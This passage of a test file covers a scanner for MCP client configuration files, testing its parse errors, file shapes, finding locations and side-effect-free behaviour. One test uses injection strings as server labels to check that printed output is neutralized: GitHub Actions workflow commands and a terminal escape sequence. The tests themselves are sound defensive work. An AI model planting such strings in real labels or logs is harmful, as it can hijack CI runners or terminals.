    });
    expect(run('{"a":1 /* x', {}, 'vscode').files[0]!.problems[0]).toMatchObject({
      category: 'unterminated-comment',
    });
  });

  it('syntax errors name their category and place', () => {
    const cases: [string, string][] = [
      ['{"a":}', 'unexpected-character'],
      ['{"a":1,}', 'unexpected-character'],
      ['{"a":1', 'unexpected-end'],
      ['{"a":"b', 'unterminated-string'],
      ['{"a":"\\x"}', 'bad-escape'],
      ['{"a":"\\u12"}', 'bad-escape'],
      ['{"a":"b\nc"}', 'control-character'],
      ['{"a":tru}', 'bad-literal'],
      ['{"a":01}', 'bad-literal'],
      ['{} x', 'trailing-content'],
      ['{"a" 1}', 'unexpected-character'],
      ['[1,,2]', 'unexpected-character'],
      ['/x', 'comment-not-allowed'],
    ];
    for (const [text, category] of cases)
      expect(parseJson(text, { comments: false }), text).toMatchObject({ ok: false, category });
    expect(
      parseJson('{"a":"\\u00e9\\n\\/","b":[1,-2.5e3,true,null]}', { comments: false }),
    ).toMatchObject({ ok: true });
  });

  it('an empty file has no root', () => {
    expect(parseJson('  \n ', { comments: false })).toEqual({ ok: true, root: undefined });
  });
});

// ---- the files ----------------------------------------------------------------------------------------------------

describe('CLI · mcp scan · client config · the files of each client', () => {
  const server = { s: { url: 'http://x.example.net/m' } };
  // Examples of the shapes in each client's documentation, read 2026-11-07 (see the task): Claude Code
  // https://code.claude.com/docs/en/mcp, Cursor https://cursor.com/docs/context/mcp, VS Code
  // https://code.visualstudio.com/docs/copilot/customization/mcp-servers, Claude Desktop
  // https://modelcontextprotocol.io/docs/develop/connect-local-servers.
  const claudeCode =
    '{ "mcpServers": { "github": { "type": "http", "url": "https://api.githubcopilot.com/mcp/", "headers": { "Authorization": "Bearer ${GITHUB_TOKEN}" } }, "files": { "type": "stdio", "command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem@2.0.1", "/srv/data"], "env": { "LOG": "${LOG_LEVEL:-info}" } } } }';
  const cursor =
    '{ "mcpServers": { "files": { "command": "npx", "args": ["-y", "mcp-server-example@1.0.0"], "env": { "API_KEY": "${env:API_KEY}" }, "envFile": ".env" } } }';
  const vscode =
    '{ "inputs": [ { "type": "promptString", "id": "api-key", "description": "API key", "password": true } ], "servers": { "api": { "type": "http", "url": "https://api.example.net/mcp", "headers": { "Authorization": "Bearer ${input:api-key}" } } } }';
  const desktop =
    '{ "mcpServers": { "filesystem": { "command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem@2.0.1", "/Users/username/Desktop"] } } }';

  it('the documentation examples read without a parse error; the references give no secret finding (AC-3)', () => {
    for (const [client, text] of [
      ['claude-code', claudeCode],
      ['cursor', cursor],
      ['vscode', vscode],
      ['claude-desktop', desktop],
    ] as const) {
      const scan = run(text, {}, client);
      expect(scan.files[0]!.problems, client).toEqual([]);
      expect(scan.files[0]!.status, client).toBe('scanned');
      expect(
        rules(scan).filter((r) => r.startsWith('scan/cfg/secret')),
        client,
      ).toEqual([]);
    }
  });

  it('.vscode/mcp.json is read under servers, .mcp.json under mcpServers; the wrong key is an invalid entry (AC-7)', () => {
    expect(
      run(json(server, 'servers'), {}, 'vscode').files[0]!.servers.map((s) => s.label),
    ).toEqual(['s']);
    expect(run(json(server, 'mcpServers')).files[0]!.servers.map((s) => s.label)).toEqual(['s']);
    const swapped = run(json(server, 'mcpServers'), {}, 'vscode');
    expect(swapped.findings.map((f) => [f.rule, f.path])).toEqual([
      ['scan/cfg/invalid-entry', 'mcpServers'],
    ]);
    expect(swapped.files[0]!.servers).toEqual([]);
    expect(swapped.status).toBe('nothing-to-scan');
    expect(run(json(server, 'servers')).findings.map((f) => f.rule)).toEqual([
      'scan/cfg/invalid-entry',
    ]);
  });

  it('an empty file, a file without servers and a file with an unknown top key are "nothing to assess", not clean (AC-8)', () => {
    for (const text of ['', '  \n', '{}', '{"mcpServers":{}}', '{"theme":"dark"}', '[]']) {
      const scan = run(text);
      expect(scan.status, text).toBe('nothing-to-scan');
      expect(scan.files[0]!.status, text).toBe('nothing-to-scan');
      expect(scan.findings, text).toEqual([]);
    }
    expect(run(json(server)).status).toBe('scanned');
  });

  it('~/.claude.json reads mcpServers and projects[*].mcpServers, and a repeated project key is not an error', () => {
    const text = JSON.stringify({
      mcpServers: { a: server.s },
      projects: { '/p': { mcpServers: { b: server.s } }, '/q': {} },
    });
    const scan = run(text, {}, 'claude-code', 'C:\\Users\\carol\\.claude.json');
    expect(scan.findings.map((f) => f.path)).toEqual([
      'mcpServers.a.url',
      'projects["/p"].mcpServers.b.url',
    ]);
    // The same shape in a project file is not read under `projects`.
    expect(run(text).findings.map((f) => f.path)).toEqual(['mcpServers.a.url']);
  });

  it('several files: each is a result of its own, with the path it came with', () => {
    const scan = scanClientConfig(
      [
        { path: '.mcp.json', client: 'claude-code', text: json(server) },
        { path: '.cursor/mcp.json', client: 'cursor', text: '{ nope' },
        { path: '.vscode/mcp.json', client: 'vscode', text: '' },
      ],
      {},
    );
    expect(scan.files.map((f) => [f.path, f.status])).toEqual([
      ['.mcp.json', 'scanned'],
      ['.cursor/mcp.json', 'unreadable'],
      ['.vscode/mcp.json', 'nothing-to-scan'],
    ]);
    expect(scan.findings.map((f) => f.file)).toEqual(['.mcp.json']);
    expect(scan.status).toBe('scanned');
  });

  it('a client the task does not list is not read', () => {
    // @ts-expect-error not a client of the table
    const scan = run(json(server), {}, 'windsurf');
    expect(scan.files[0]!.status).toBe('unreadable');
    expect(scan.files[0]!.problems).toEqual([{ kind: 'unknown-client' }]);
  });
});

describe('CLI · mcp scan · client config · where a finding points (AC-9)', () => {
  it('the line and column match the editor for LF, CRLF and a lone CR, with tabs and non-BMP characters before', () => {
    const body = (nl: string) =>
      `{${nl}\t"mcpServers": {${nl}\t\t"😀": { "url": "http://x.example.net/m" }${nl}\t}${nl}}`;
    for (const nl of ['\n', '\r\n', '\r']) {
      const text = body(nl);
      const f = only(run(text), 'scan/cfg/http-plaintext');
      expect({ line: f.line, column: f.column }, JSON.stringify(nl)).toEqual(
        where(text, '"http://x'),
      );
      expect(f.line).toBe(3);
    }
  });

  it('lineLocator counts a byte order mark as nothing and each of the three line ends as one', () => {
    const text = '\uFEFFa\r\nb\rc\nd\r\n\r\ne';
    const at = lineLocator(text);
    expect([
      at(text.indexOf('a')),
      at(text.indexOf('b')),
      at(text.indexOf('c')),
      at(text.indexOf('d')),
      at(text.indexOf('e')),
    ]).toEqual([
      { line: 1, column: 1 },
      { line: 2, column: 1 },
      { line: 3, column: 1 },
      { line: 4, column: 1 },
      { line: 6, column: 1 },
    ]);
  });

  it('a long line of a minified file still gives the right column', () => {
    const text = `{"mcpServers":{${'"a":{"command":"x"},'.repeat(2000)}"z":{"url":"http://x.example.net/m"}}}`;
    const f = only(run(text), 'scan/cfg/http-plaintext');
    expect(f.column).toBe(text.indexOf('"http://x') + 1);
  });
});

// ---- the text we print --------------------------------------------------------------------------------------------

describe('CLI · mcp scan · client config · text from the file is safe to print', () => {
  it('a server label that starts with :: or holds a terminal sequence is neutralized in every field', () => {
    const scan = run(
      json({
        '::error file=x::pwned': { url: 'http://x.example.net/m' },
        '\u001b[2Jclear': { url: 'http://y.example.net/m' },
        '##[set-output name=a]b': { url: 'http://z.example.net/m' },
      }),
    );
    expect(scan.findings).toHaveLength(3);
    for (const f of scan.findings) {
      for (const text of [f.server, f.path, f.message, formatConfigFinding(f)]) {
        expect(text.startsWith('::')).toBe(false);
        expect(text).not.toMatch(/\u001b/);
        expect(text).not.toContain('##[');
      }
    }
    for (const f of scan.files[0]!.servers) expect(f.label.startsWith('::')).toBe(false);
  });

  it('a label with a dot or quote is written so the path is unambiguous', () => {
    expect(
      only(run(json({ 'a.b': { url: 'http://x.example.net/m' } })), 'scan/cfg/http-plaintext').path,
    ).toBe('mcpServers["a.b"].url');
  });

  it('a very long label is cut', () => {
    expect(
      only(
        run(json({ ['n'.repeat(500)]: { url: 'http://x.example.net/m' } })),
        'scan/cfg/http-plaintext',
      ).path.length,
    ).toBeLessThan(100);
  });
});

describe('CLI · mcp scan · client config · no disk, no network, no process (AC-6)', () => {
  it('a scan of every kind of file touches none of them', () => {
    vi.clearAllMocks();
    run(
      json({
        s: { command: 'npx', args: ['-y', 'name'], envFile: '.env', env: { TOKEN: 'x' } },
        u: { url: 'http://x.example.net/m' },
      }),
      { allowHosts: ['y.example.net'], snapshots: SNAPSHOTS },
    );
    expect([io.spawn, io.connect, io.readFile, io.fetch].map((f) => f.mock.calls.length)).toEqual([
      0, 0, 0, 0,
    ]);
  });

  it('is deterministic and does not change what it was given', () => {
    const files = [
      {
        path: '.mcp.json',
        client: 'claude-code' as const,
        text: json({ s: { url: 'http://x.example.net/m' } }),
      },
    ];
    const frozen = JSON.stringify(files);
    expect(scanClientConfig(files, {})).toEqual(scanClientConfig(files, {}));
    expect(JSON.stringify(files)).toBe(frozen);
  });
});
